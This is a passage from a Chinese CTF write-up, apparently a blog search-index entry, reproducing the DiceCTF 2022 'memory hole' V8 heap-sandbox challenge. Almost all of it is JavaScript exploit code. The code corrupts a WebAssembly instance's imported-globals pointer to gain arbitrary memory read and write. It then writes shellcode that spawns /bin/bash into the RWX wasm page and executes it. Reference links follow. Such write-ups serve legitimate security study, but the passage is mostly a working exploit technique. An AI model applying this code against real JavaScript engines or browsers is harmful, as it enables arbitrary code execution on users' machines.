vuln_elements_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(vuln_elements_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmInstanceAddr = <span class="title function_">addressOf</span>(wasmInstance);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] wasmInstanceAddr =&gt; &quot;</span> + <span class="title function_">hex</span>(wasmInstanceAddr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> imported_mutable_globals_addr = wasmInstanceAddr - <span class="number">1</span> + <span class="number">0x50</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] imported_mutable_globals_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(imported_mutable_globals_addr));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> split = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// modify imported_mutable_globals =&gt; arr_in_fake_mutable_globals_addr</span></span><br><span class="line"><span class="keyword">var</span> imported_mutable_globals_index = (imported_mutable_globals_addr - vuln_elements_addr) / <span class="number">8</span>;</span><br><span class="line"><span class="keyword">if</span> (imported_mutable_globals_index % <span class="number">1</span> == <span class="number">0.5</span>) &#123;</span><br><span class="line">    imported_mutable_globals_index = imported_mutable_globals_index - <span class="number">0.5</span>;</span><br><span class="line">    split = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] imported_mutable_globals_index =&gt; &quot;</span> + imported_mutable_globals_index);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr_in_fake_mutable_globals_index = (arr_in_fake_mutable_globals_addr - vuln_elements_addr) / <span class="number">8</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] arr_in_fake_mutable_globals_index =&gt; &quot;</span> + arr_in_fake_mutable_globals_index);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> target_addr = js_base + arr_in_fake_mutable_globals_addr;</span><br><span class="line"><span class="keyword">if</span> (!split)</span><br><span class="line">    vuln_arr[imported_mutable_globals_index] = <span class="title function_">u2d</span>(target_addr);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[!] split!!!&quot;</span>);</span><br><span class="line">    <span class="title function_">d22u</span>(vuln_arr[imported_mutable_globals_index + <span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">var</span> pad1 = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">var</span> high = js_base / <span class="number">0x100000000</span> <span class="comment">// + (pad1 * 0x100000000);</span></span><br><span class="line">    vuln_arr[imported_mutable_globals_index] = <span class="title function_">u2d</span>(arr_in_fake_mutable_globals_addr * <span class="number">0x100000000</span>);</span><br><span class="line">    vuln_arr[imported_mutable_globals_index + <span class="number">1</span>] = <span class="title function_">u2d</span>(high);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">getGlobal</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">addr, val</span>) &#123;</span><br><span class="line">    fake_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="title function_">setGlobal</span>(<span class="title class_">BigInt</span>(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode1 = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>,</span><br><span class="line">    <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>,</span><br><span class="line">    <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">var</span> wasm2 = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode1);</span><br><span class="line"><span class="keyword">var</span> wasmInstance_attack = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm2);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance_attack.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmInstance_attack_addr = <span class="title function_">addressOf</span>(wasmInstance_attack);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] wasmInstance_attack_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(wasmInstance_attack_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_offset = wasmInstance_attack_addr + <span class="number">0x60</span> - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_addr = <span class="title function_">arbRead</span>(rwx_offset + js_base);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] rwx_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(rwx_addr));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">0xb848686a</span>, <span class="number">0x6e69622f</span>, <span class="number">0x7361622f</span>, <span class="number">0xe7894850</span>, <span class="number">0xb848686a</span>, <span class="number">0x6e69622f</span>, <span class="number">0x7361622f</span>, <span class="number">0x56f63150</span>, <span class="number">0x485e086a</span>, <span class="number">0x4856e601</span>, <span class="number">0xd231e689</span>, <span class="number">0xf583b6a</span>, <span class="number">0x90909005</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbWrite</span>(<span class="title function_">b2u</span>(rwx_addr) + i * <span class="number">4</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// %DebugPrint(vuln_arr);</span></span><br><span class="line"><span class="comment">// %DebugPrint(wasmInstance);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>

<p>文中如有错误和疑问，还望及时交流探讨。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html#">Dice CTF Memory Hole: Breaking V8 Heap Sandbox (mem2019.github.io)</a></li>
<li>[<a href="https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/">DiceCTF 2022] - memory hole | kylebot’s Blog</a></li>
<li><a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#heading=h.xzptrog8pyxf">V8 Sandbox - High-Level Design Doc - Google 文档</a></li>
<li><a href="https://tttang.com/archive/1443/#toc_0x01">V8 沙箱绕过 - 跳跳糖 (tttang.com)</a></li>
</ol>
]]></content>
      <categories>
        <category>题目复现</category>
      </categories>
      <tags>
        <tag>V8</tag>
        <tag>sandbox</tag>
      </tags>
  </entry>
</search>
